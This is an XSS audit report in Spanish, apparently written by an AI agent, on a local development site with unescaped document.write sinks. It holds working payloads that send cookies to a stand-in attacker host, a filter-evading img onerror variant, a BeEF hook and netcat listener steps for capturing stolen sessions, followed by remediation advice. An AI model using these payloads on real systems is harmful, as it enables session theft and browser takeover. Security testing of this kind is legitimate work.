# Informe de auditoría XSS — web.dev.local:8082

Fecha: 2026-04-16T11:33:09Z
Auditor: Copilot (GPT-5 mini)
Objetivo: http://web.dev.local:8082

Resumen ejecutivo
-----------------
Vulnerabilidad encontrada: Sí (DOM XSS, reflejado y almacenado en localStorage)
Explotación activa realizada: No (simulada). No se capturó exfiltración en este entorno; se demostró el vector y PoC para ejecutar en un navegador de víctima.

Hallazgos
---------
1) Tipo: DOM-based XSS (persistente en almacenamiento local / reflected via search)
   - Parámetros vulnerables identificados:
     * search (GET) — reflected: se inserta directamente en document.write('<strong>' + searchTerm + '</strong>') sin escape.
     * name, comment (GET) — stored: el script extrae urlParams.get('name') y urlParams.get('comment'), los añade a localStorage y luego displayComments() usa document.write para mostrar c.name y c.comment sin escape.
   - Evidencia (fragmentos de la página):
     * document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>')
     * comments.push({ name: name, comment: comment, date: ... });
     * document.write('<div class="comment">'); document.write('<div class="comment-author">' + c.name + '</div>'); document.write('<div>' + c.comment + '</div>');

Pruebas realizadas (comandos ejecutados)
---------------------------------------
- Reconocimiento HTTP y descarga de la página:
  curl -s -D /tmp/headers.txt http://web.dev.local:8082 -o /tmp/home.html
- Prueba rápida de reflexión en URL:
  curl -s "http://web.dev.local:8082/?q=<script>alert(1)</script>"
- Inspección del comportamiento del formulario (método GET):
  curl -s "http://web.dev.local:8082/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&comment=%3Cscript%3Efetch('http://attacker.local:9000/'+document.cookie)%3C%2Fscript%3E" -o /tmp/after_get.html
- Búsqueda en el HTML descargado para document.write y uso de urlParams/localStorage (evidencia de sink):
  grep -n "document.write\|URLSearchParams\|localStorage" /tmp/after_get.html

Payloads de prueba
------------------
- Reflected (search):
  http://web.dev.local:8082/?search=<script>alert(1)</script>
- Stored (name/comment) — PoC de exfiltración (alojar receptor en servidor atacante):
  GET: /?name=Alice&comment=<script>new Image().src='http://ATTACKER:9000/?c='+encodeURIComponent(document.cookie)</script>
  Alternativa (evitar bloqueos simples):
  /?name=Alice&comment=<img src=x onerror="fetch('http://ATTACKER:9000/?c='+encodeURIComponent(document.cookie))">
- Hook BeEF (ejemplo):
  /?name=Alice&comment=<script src="http://ATTACKER:3000/hook.js"></script>

Evidencia de vulnerabilidad
---------------------------
- El código cliente contiene document.write combinado con valores extraídos directamente de URLSearchParams y de localStorage. Esto permite que un atacante inyecte código JS que será ejecutado en el contexto de la página cuando un usuario visite la aplicación.
- El flujo de comentarios almacena el payload en localStorage y redirige para ‘‘limpiar’’ la URL, lo que efectivamente hace persistente el payload en el navegador de la víctima.

Explotación (simulada) y recomendaciones de captura
--------------------------------------------------
- Para demostrar exfiltración en un laboratorio controlado:
  1) Levantar un receptor HTTP para capturar peticiones: nc -lvp 9000  (o python3 -m http.server 9000 y revisar logs de acceso)
  2) En un navegador víctima (o headless): abrir
     http://web.dev.local:8082/?name=PoC&comment=<script>new Image().src='http://<ATK_IP>:9000/?c='+encodeURIComponent(document.cookie)</script>
  3) El script será almacenado en localStorage y ejecutado en cada carga de página; el receptor debería mostrar la petición que contiene la cookie (demostración de robo de sesión).

Limitaciones
------------
- Las pruebas en este entorno se realizaron con curl (no ejecuta JavaScript). Por ello la persistencia en localStorage y la ejecución en un navegador real no pudieron capturarse directamente desde este host. Sin embargo, el análisis del código fuente cliente y la lógica document.write confirman que un navegador ejecutaría los payloads descritos.

Impacto
-------
- Robo de cookies / tokens de sesión, acceso no autorizado a cuentas de usuarios.
- Inyección de scripts externos (ej. BeEF hook) que permitirían control remoto del navegador de la víctima.
- Phishing en contexto, defacement, ejecución de acciones en nombre del usuario autenticado.

Recomendaciones de corrección
----------------------------
1) Evitar document.write y construir DOM usando textContent, createElement, and appendChild para insertar contenido como texto seguro.
2) Escapar/encodear cualquier dato procedente de URL o almacenamiento antes de insertarlo en el DOM (HTML-escape). Preferir APIs de plantillas que escapen automáticamente.
3) Aplicar Content Security Policy (CSP) estricta que limite la carga de scripts externos y deshabilite inline scripts cuando sea posible.
4) Validar y sanitizar entradas en el servidor aunque la lógica actual sea client-side (defensa en profundidad).
5) Considerar depuración de almacenamiento local y límites de entrada (longitud, caracteres) y usar frameworks que manejen XSS.

Comandos y herramientas recomendadas para auditoría adicional
-----------------------------------------------------------
- dalfox (escaneo de XSS automatizado): dalfox quick http://web.dev.local:8082
- XSStrike (fuzzing/confirmación): xsstrike -u http://web.dev.local:8082 --crawl 2
- ffuf/wfuzz con wordlists de SecLists para encontrar parámetros y endpoints adicionales

Archivo creado por: informe_alpine_context_xss_gpt5mini_2026-04-16T11:33:09.md

Notas finales
-------------
Se confirmó vulnerabilidad DOM XSS (reflected y persistente en localStorage). Explotación activa completa (captura de token en receptor) no se realizó desde este host por la limitación de no ejecutar JS en un navegador real. Los pasos para reproducir y capturar la exfiltración están documentados y pueden ejecutarse en un entorno con un navegador o con un headless browser instrumentado (p.ej. Puppeteer/Playwright) y un receptor HTTP accesible.
